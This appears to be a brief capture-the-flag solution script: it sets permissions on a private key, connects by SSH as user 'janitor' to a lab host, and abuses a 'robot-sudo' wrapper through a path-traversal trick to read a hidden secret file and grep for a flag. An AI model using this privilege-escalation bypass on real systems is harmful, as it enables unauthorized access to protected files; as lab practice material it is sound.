chmod 600 id_rsa

echo "mkdir /usr/local/bin/vacuum-controller;robot-sudo /usr/local/bin/vacuum-controller/../robot-sudo /etc/.extra/hidden/th3CEO 662a6d08664c68d30306f35361357bf7;exit" | ssh -tt -i id_rsa janitor@141.85.228.32 | grep SpeishFlag
